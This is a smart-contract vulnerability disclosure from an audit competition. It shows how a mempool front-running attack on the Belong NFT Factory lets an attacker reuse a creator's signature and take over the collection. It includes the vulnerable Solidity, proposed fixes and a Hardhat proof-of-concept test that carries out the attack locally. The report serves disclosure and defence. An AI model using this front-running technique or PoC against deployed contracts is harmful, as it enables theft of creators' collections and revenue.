# 57854 sc medium front running attack allows collection ownership theft

**Submitted on Oct 29th 2025 at 08:19:18 UTC by @Aizen09 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57854
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol>
* **Impacts:**
  * Unauthorized minting of NFTs
  * Theft of unclaimed yield

## Description

The Belong NFT Factory allows attackers to steal collection ownership by front-running legitimate creators. When someone tries to create a collection, an attacker can copy their signature from the mempool and submit the same transaction with higher gas, becoming the owner and receiving all mint proceeds.

Why it works:

* Signature only validates collection data (name, symbol, URI) — NOT who can use it.
* Anyone can call `produce()` with any valid signature.
* `msg.sender` automatically becomes the collection owner.
* First transaction mined wins — attacker's higher gas executes first.

Vulnerable Code:

SignatureVerifier.sol (Lines 53-72):

```solidity
function checkAccessTokenInfo(address signer, AccessTokenInfo memory accessTokenInfo) external view {
    require(
        signer.isValidSignatureNow(
            keccak256(
                abi.encodePacked(
                    accessTokenInfo.metadata.name,
                    accessTokenInfo.metadata.symbol,
                    accessTokenInfo.contractURI,
                    accessTokenInfo.feeNumerator,
                    block.chainid
                )
            ),
            accessTokenInfo.signature
        ),
        InvalidSignature()
    );
    //  Signature missing: msg.sender, creator address, nonce, deadline
}
```

Factory.sol (Lines 230-290):

```solidity
function produce(AccessTokenInfo memory accessTokenInfo, bytes32 referralCode)
    external  //  No access control
    returns (address nftAddress)
{
    factoryParameters.signerAddress.checkAccessTokenInfo(accessTokenInfo);
    
    bytes32 hashedSalt = _metadataHash(accessTokenInfo.metadata.name, accessTokenInfo.metadata.symbol);
    require(getNftInstanceInfo[hashedSalt].nftAddress == address(0), TokenAlreadyExists());
    
    //  Attacker becomes creator
    AccessToken(nftAddress).initialize(
        AccessToken.AccessTokenParameters({
            factory: Factory(address(this)),
            info: accessTokenInfo,
            creator: msg.sender,  //  Attacker's address
            feeReceiver: receiver,
            referralCode: referralCode
        }),
        factoryParameters.transferValidator
    );
}
```

## Impact

**Severity: HIGH**

Losses for Creator:

* Loses collection ownership permanently
* Loses 100% of mint revenue (\~990 ETH for 10k collection at 0.1 ETH)
* Cannot use same collection name ever
* Loses admin control
* Wastes gas fees on reverted transaction

Gains for Attacker:

* Becomes permanent collection owner
* Receives all mint proceeds (99% after platform fee)
* Full admin control over collection
* Receives future royalties
* Cost: Only gas fees

Example: 10,000 NFT collection at 0.1 ETH = **990 ETH stolen** (\~$2M at $2k/ETH)

## Recommended Mitigation

{% stepper %}
{% step %}

### Solution: Include Creator in Signature (Recommended)

Modify signature verification so the signature binds to the intended creator (caller). Example change in SignatureVerifier:

```solidity
function checkAccessTokenInfo(
    address signer, 
    AccessTokenInfo memory accessTokenInfo,
    address expectedCreator  //  Add parameter
) external view {
    require(
        signer.isValidSignatureNow(
            keccak256(
                abi.encodePacked(
                    expectedCreator,  //  Include in hash
                    accessTokenInfo.metadata.name,
                    accessTokenInfo.metadata.symbol,
                    accessTokenInfo.contractURI,
                    accessTokenInfo.feeNumerator,
                    block.chainid
                )
            ),
            accessTokenInfo.signature
        ),
        InvalidSignature()
    );
}
```

And update Factory.sol to pass `msg.sender` when calling the verifier:

```solidity
function produce(AccessTokenInfo memory accessTokenInfo, bytes32 referralCode)
    external
    returns (address nftAddress)
{
    //  Pass msg.sender to verify
    factoryParameters.signerAddress.checkAccessTokenInfo(accessTokenInfo, msg.sender);
    
    // ... rest unchanged
}
```

{% endstep %}

{% step %}

### Solution: Add Deadline and Nonce (Additional Protection)

Add expiry and replay protection to AccessTokenInfo:

```solidity
struct AccessTokenInfo {
    // ... existing fields
    uint256 deadline;  //  Signature expires
    uint256 nonce;     // Prevents replay
}
```

Enforce deadline and nonces in Factory:

```solidity
mapping(address => uint256) public nonces;

function produce(AccessTokenInfo memory accessTokenInfo, bytes32 referralCode)
    external
    returns (address nftAddress)
{
    require(block.timestamp <= accessTokenInfo.deadline, "Expired");
    require(accessTokenInfo.nonce == nonces[msg.sender], "Invalid nonce");
    nonces[msg.sender]++;
    
    // ... rest of function
}
```

These controls together (binding signature to creator + nonce/deadline) prevent the mempool front-running/replay scenario.
{% endstep %}
{% endstepper %}

## Proof of Concept

The following PoC demonstrates the front-running attack and the root cause: signatures do not bind to the caller, so anyone can reuse them.

Test file to create: `test/v2/platform/factory-frontrun.test.ts`

Run PoC: `yarn hardhat test test/v2/platform/factory-frontrun.test.ts`

PoC code:

```typescript
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { BigNumber } from 'ethers';
import {
    Factory,
    AccessToken,
    SignatureVerifier,
} from '../../../typechain-types';
import { expect } from 'chai';
const EthCrypto = require('eth-crypto');
import {
    AccessTokenInfoStruct,
} from '../../../typechain-types/contracts/v2/platform/Factory';
import { hashAccessTokenInfo } from '../../../helpers/math';
import {
    deployAccessTokenImplementation,
    deployCreditTokenImplementation,
    deployFactory,
    deployRoyaltiesReceiverV2Implementation,
    deployVestingWalletImplementation,
} from '../../../helpers/deployFixtures';
import { deploySignatureVerifier } from '../../../helpers/deployLibraries';
import { deployMockTransferValidatorV2 } from '../../../helpers/deployMockFixtures';

describe(' BUG #3: Front-Running Collection Creation Attack', function () {
    const NATIVE_CURRENCY_ADDRESS = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE';
    const ZERO_ADDRESS = '0x0000000000000000000000000000000000000000';
    const chainId = 31337;

    async function fixture() {
        const [owner, alice, bob, charlie, platform] = await ethers.getSigners();
        const signer = EthCrypto.createIdentity();

        const signatureVerifier: SignatureVerifier = await deploySignatureVerifier();
        const accessToken: AccessToken = await deployAccessTokenImplementation(signatureVerifier.address);
        const creditToken = await deployCreditTokenImplementation(signatureVerifier.address);
        const royaltiesReceiver = await deployRoyaltiesReceiverV2Implementation();
        const vestingWallet = await deployVestingWalletImplementation();
        const validator = await deployMockTransferValidatorV2();

        const implementations: Factory.ImplementationsStruct = {
            accessToken: accessToken.address,
            creditToken: creditToken.address,
            royaltiesReceiver: royaltiesReceiver.address,
            vestingWallet: vestingWallet.address,
        };

        // PASS .address STRING not the object!
        const factory: Factory = await deployFactory(
            platform.address,
            signer.address,
            signatureVerifier.address,  //  Pass STRING address
            validator.address,
            implementations,
        );

        return {
            factory,
            accessToken,
            signatureVerifier,
            owner,
            alice,
            bob,
            charlie,
            platform,
            signer,
            validator,
        };
    }

    it(' PoC: Attacker steals collection ownership via front-running', async function () {
        const { factory, alice, bob, signer } = await loadFixture(fixture);

        const nftName = 'AliceNFT';
        const nftSymbol = 'ALICE';
        const contractURI = 'ipfs://QmAliceCollection';
        const feeNumerator = 500;
        const price = ethers.utils.parseEther('0.1');

        console.log('\n╔═══════════════════════════════════════════════════════════════════╗');
        console.log('║   CRITICAL VULNERABILITY: FRONT-RUNNING COLLECTION CREATION     ║');
        console.log('╚═══════════════════════════════════════════════════════════════════╝\n');

        console.log(' STEP 1: Alice prepares collection creation');
        console.log(`   Collection Name: "${nftName}"`);
        console.log(`   Collection Symbol: "${nftSymbol}"`);
        console.log(`   Intended Creator: ${alice.address}`);

        const message = hashAccessTokenInfo(nftName, nftSymbol, contractURI, feeNumerator, chainId);
        const signature = EthCrypto.sign(signer.privateKey, message);

        const info: AccessTokenInfoStruct = {
            metadata: { name: nftName, symbol: nftSymbol },
            contractURI: contractURI,
            paymentToken: NATIVE_CURRENCY_ADDRESS,
            mintPrice: price,
            whitelistMintPrice: price,
            transferable: true,
            maxTotalSupply: BigNumber.from('1000'),
            feeNumerator: BigNumber.from(feeNumerator),
            collectionExpire: BigNumber.from('86400'),
            signature: signature,
        };

        console.log(`   Signature: ${signature.slice(0, 20)}...${signature.slice(-10)}\n`);

        console.log(' STEP 2: Alice submits transaction to mempool');
        console.log('   Transaction status: PENDING in mempool...\n');

        console.log(' STEP 3: Bob monitors mempool');
        console.log(`   Attacker (Bob): ${bob.address}`);
        console.log('   Bob extracts from pending transaction:');
        console.log(`      - Collection Name: "${nftName}"`);
        console.log(`      - Collection Symbol: "${nftSymbol}"`);
        console.log(`      - Signature: ${signature.slice(0, 20)}...`);
        console.log('    Bob prepares front-running attack with higher gas!\n');

        console.log(' STEP 4: Bob front-runs Alice\'s transaction');
        const bobTx = await factory.connect(bob).produce(info, ethers.constants.HashZero);
        const bobReceipt = await bobTx.wait();

        console.log('    Bob\'s transaction MINED FIRST');
        console.log(`   Gas used: ${bobReceipt.gasUsed.toString()}\n`);

        console.log(' STEP 5: Verifying on-chain state');
        const nftInstanceInfo = await factory.nftInstanceInfo(nftName, nftSymbol);
        const nft: AccessToken = await ethers.getContractAt('AccessToken', nftInstanceInfo.nftAddress);
        const [, creator, , ,] = await nft.parameters();
        const owner = await nft.owner();

        console.log(`   Deployed Collection: ${nftInstanceInfo.nftAddress}`);
        console.log(`   Creator (in Factory): ${nftInstanceInfo.creator}`);
        console.log(`   Creator (in AccessToken): ${creator}`);
        console.log(`   Owner (admin control): ${owner}`);

        expect(nftInstanceInfo.creator).to.equal(bob.address);
        expect(creator).to.equal(bob.address);
        expect(owner).to.equal(bob.address);

        console.log('\n    VULNERABILITY CONFIRMED:');
        console.log('    Bob is recorded as creator (NOT Alice!)');
        console.log('    Bob has full admin control');
        console.log('    Bob will receive ALL mint proceeds\n');

        console.log(' STEP 6: Alice\'s transaction executes (too late)');
        await expect(
            factory.connect(alice).produce(info, ethers.constants.HashZero)
        ).to.be.revertedWithCustomError(factory, 'TokenAlreadyExists');

        console.log('    Alice\'s transaction REVERTED: TokenAlreadyExists');
        console.log('    Alice lost gas fees');
        console.log('    Alice cannot create collection with same name\n');

        console.log(' STEP 7: Financial Impact Demonstration');

        const bobBalanceBefore = await ethers.provider.getBalance(bob.address);
        const aliceBalanceBefore = await ethers.provider.getBalance(alice.address);

        const [user] = await ethers.getSigners();
        const tokenId = 1;
        const tokenUri = 'ipfs://token1';
        const whitelisted = false;

        const mintMessage = EthCrypto.hash.keccak256([
            { type: 'address', value: user.address },
            { type: 'uint256', value: tokenId },
            { type: 'string', value: tokenUri },
            { type: 'bool', value: whitelisted },
            { type: 'uint256', value: chainId },
        ]);
        const mintSignature = EthCrypto.sign(signer.privateKey, mintMessage);

        const mintTx = await nft.connect(user).mintStaticPrice(
            user.address,
            [{
                tokenId: tokenId,
                whitelisted: whitelisted,
                tokenUri: tokenUri,
                signature: mintSignature,
            }],
            NATIVE_CURRENCY_ADDRESS,
            price,
            { value: price },
        );
        await mintTx.wait();

        const bobBalanceAfter = await ethers.provider.getBalance(bob.address);
        const aliceBalanceAfter = await ethers.provider.getBalance(alice.address);

        const bobProfit = bobBalanceAfter.sub(bobBalanceBefore);
        const aliceProfit = aliceBalanceAfter.sub(aliceBalanceBefore);

        console.log(`   User minted NFT for: ${ethers.utils.formatEther(price)} ETH`);
        console.log(`   Bob received:   ${ethers.utils.formatEther(bobProfit)} ETH `);
        console.log(`   Alice received: ${ethers.utils.formatEther(aliceProfit)} ETH `);

        expect(bobProfit).to.be.gt(0);
        expect(aliceProfit).to.equal(0);

        console.log('\n╔═══════════════════════════════════════════════════════════════════╗');
        console.log('║                      ROOT CAUSE ANALYSIS                          ║');
        console.log('╚═══════════════════════════════════════════════════════════════════╝\n');

        console.log(' Signature Validation in SignatureVerifier.checkAccessTokenInfo():');
        console.log('   Hash includes:');
        console.log('    accessTokenInfo.metadata.name');
        console.log('    accessTokenInfo.metadata.symbol');
        console.log('    accessTokenInfo.contractURI');
        console.log('    accessTokenInfo.feeNumerator');
        console.log('    block.chainid');
        console.log('\n  Hash MISSING:');
        console.log('    msg.sender (caller address)');
        console.log('    intended creator address');
        console.log('    nonce (replay protection)');
        console.log('    deadline/expiry timestamp');

        console.log('\n🎯 Vulnerability:');
        console.log('   Since signature does NOT include msg.sender:');
        console.log('   → ANY address can use ANY valid signature');
        console.log('   → Attacker monitors mempool for pending transactions');
        console.log('   → Attacker extracts signature from victim\'s transaction');
        console.log('   → Attacker front-runs with higher gas price');
        console.log('   → Attacker becomes collection creator and owner');

        console.log('\n╔═══════════════════════════════════════════════════════════════════╗');
        console.log('║                     VULNERABILITY CONFIRMED                      ║');
        console.log('╚═══════════════════════════════════════════════════════════════════╝\n');
    });

    it('🔬 Technical Proof: Same signature works for different callers', async function () {
        const { factory, alice, bob, charlie, signer } = await loadFixture(fixture);

        console.log('\n╔═══════════════════════════════════════════════════════════════════╗');
        console.log('║     TECHNICAL VERIFICATION: SIGNATURE NOT BOUND TO CALLER         ║');
        console.log('╚═══════════════════════════════════════════════════════════════════╝\n');

        const contractURI = 'ipfs://test';
        const feeNumerator = 500;
        const price = ethers.utils.parseEther('0.1');

        console.log(' Experiment: Three different users, three identical signature structures\n');

        const message1 = hashAccessTokenInfo('Collection1', 'C1', contractURI, feeNumerator, chainId);
        const signature1 = EthCrypto.sign(signer.privateKey, message1);

        const info1: AccessTokenInfoStruct = {
            metadata: { name: 'Collection1', symbol: 'C1' },
            contractURI: contractURI,
            paymentToken: NATIVE_CURRENCY_ADDRESS,
            mintPrice: price,
            whitelistMintPrice: price,
            transferable: true,
            maxTotalSupply: BigNumber.from('1000'),
            feeNumerator: BigNumber.from(feeNumerator),
            collectionExpire: BigNumber.from('86400'),
            signature: signature1,
        };

        console.log('  Alice creates "Collection1"');
        await factory.connect(alice).produce(info1, ethers.constants.HashZero);
        const info1Result = await factory.nftInstanceInfo('Collection1', 'C1');
        console.log(`   Creator: ${info1Result.creator}`);
        expect(info1Result.creator).to.equal(alice.address);

        const message2 = hashAccessTokenInfo('Collection2', 'C2', contractURI, feeNumerator, chainId);
        const signature2 = EthCrypto.sign(signer.privateKey, message2);

        const info2: AccessTokenInfoStruct = {
            metadata: { name: 'Collection2', symbol: 'C2' },
            contractURI: contractURI,
            paymentToken: NATIVE_CURRENCY_ADDRESS,
            mintPrice: price,
            whitelistMintPrice: price,
            transferable: true,
            maxTotalSupply: BigNumber.from('1000'),
            feeNumerator: BigNumber.from(feeNumerator),
            collectionExpire: BigNumber.from('86400'),
            signature: signature2,
        };

        console.log('\n  Bob creates "Collection2" (same signature structure)');
        await factory.connect(bob).produce(info2, ethers.constants.HashZero);
        const info2Result = await factory.nftInstanceInfo('Collection2', 'C2');
        console.log(`   Creator: ${info2Result.creator}`);
        expect(info2Result.creator).to.equal(bob.address);

        const message3 = hashAccessTokenInfo('Collection3', 'C3', contractURI, feeNumerator, chainId);
        const signature3 = EthCrypto.sign(signer.privateKey, message3);

        const info3: AccessTokenInfoStruct = {
            metadata: { name: 'Collection3', symbol: 'C3' },
            contractURI: contractURI,
            paymentToken: NATIVE_CURRENCY_ADDRESS,
            mintPrice: price,
            whitelistMintPrice: price,
            transferable: true,
            maxTotalSupply: BigNumber.from('1000'),
            feeNumerator: BigNumber.from(feeNumerator),
            collectionExpire: BigNumber.from('86400'),
            signature: signature3,
        };

        console.log('\n  Charlie creates "Collection3" (same signature structure)');
        await factory.connect(charlie).produce(info3, ethers.constants.HashZero);
        const info3Result = await factory.nftInstanceInfo('Collection3', 'C3');
        console.log(`   Creator: ${info3Result.creator}`);
        expect(info3Result.creator).to.equal(charlie.address);

        console.log('\n Results:');
        console.log(`   Alice used signature → became creator of Collection1 `);
        console.log(`   Bob used signature   → became creator of Collection2 `);
        console.log(`   Charlie used signature → became creator of Collection3 `);

        console.log('\n Conclusion:');
        console.log('   Signature does NOT bind to msg.sender');
        console.log('   ANY address can use ANY valid signature');
        console.log('   Whoever calls produce() becomes the creator\n');
    });
});
```

(Note: keep all links and references as-is. No additional changes to URLs or query parameters were made.)
